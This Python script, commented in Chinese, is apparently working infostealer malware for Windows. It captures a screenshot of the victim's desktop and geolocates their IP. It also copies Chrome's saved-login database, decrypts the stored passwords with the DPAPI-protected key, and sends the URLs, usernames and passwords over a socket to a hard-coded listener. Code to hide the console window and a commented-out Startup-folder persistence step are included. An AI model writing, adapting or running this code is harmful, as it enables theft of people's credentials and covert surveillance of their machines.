import os,sys
from posixpath import split
import socket
#获取PC信息模块
from uuid import getnode as get_mac 
import platform
import psutil
import getpass
from ip2geotools.databases.noncommercial import DbIpCity
import requests

#截图模块
from PIL import ImageGrab
from PIL import Image


#解密用到的模块
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import datetime

#隐藏窗口
import ctypes
 
whnd = ctypes.windll.kernel32.GetConsoleWindow()    
if whnd != 0:    
    ctypes.windll.user32.ShowWindow(whnd, 1) #改成0隐藏启动
    ctypes.windll.kernel32.CloseHandle(whnd)  

"""
# 开机自启
file = sys.argv[0] 
file_name = os.path.basename(file) 
user_path = os.path.expanduser('~')

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{file_name}"):
        os.system(f'copy "{file}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

"""


log = """"""


#截图桌面
def get_screenshot():
    path = datetime.datetime.now().strftime("%Y-%m-%d-%H%M%S")
    screen = ImageGrab.grab()
    screen.save("{}.png".format(path)) 

#获取IP解析地理位置
def get_location():
    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key = "free")
    geo_data = f" IP地址: {response.ip_address}\n 国家: {response.country}\n 地区: {response.region}\n 城镇: {response.city}\n"
    return geo_data 




#获取Chrome浏览器密码
class Chrome:
    def get_passwd_chrome(self):
        #调用获取到的密文设置成变量key,进行对password解密得到明文密码
        def decrypt_password(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""

        key = self.get_encryption_key()
        result = ""
        try:
            c0nnect = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")#Chrome浏览器默认存储数据目录
            filename = "ChromeData.db"
            shutil.copyfile(c0nnect, filename)
            db = sqlite3.connect(filename)
            curs0r = db.cursor()
            curs0r.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in curs0r.fetchall():
                url = row[0]
                username = row[2]
                password = decrypt_password(row[3], key)#得到加密数据
                result += f"----{url}|{username}|{password}----"
            return f"{log}\n{result}"
        except:
            return "谷歌浏览器未安装或未找到数据存储路径！"

    #获取Chrome密文
    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")#密文路径

        with open(local_state_path, "r", encoding="utf-8") as f:#读取密文数据
                local_state = f.read()
                local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])#解密
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

get_location()#获取IP解析地理位置
get_screenshot()#获取受害者桌面截图
c = str(Chrome().get_passwd_chrome())#获取chrome密码
lens = str(len(c))


class connect(object):

    def __init__(self,ip,port):
        self.client=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #創建對象
        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.ip = ip
        self.port = port
        

    def startListen(self):
        while 1:
            self.client.connect((self.ip,self.port))
            while 1:
                    data = self.client.recv(1024).decode()
                    
                    if 'len' in data:
                        self.client.send(lens.encode())
                        break
            while 1:
                self.client.send(c.encode())


def init():
    global ipp
    global portt
    global userr
    

    ipp = "127.0.0.1"
    portt= 956
    
    LOL = connect(ipp,portt)
    LOL.startListen()
    

init()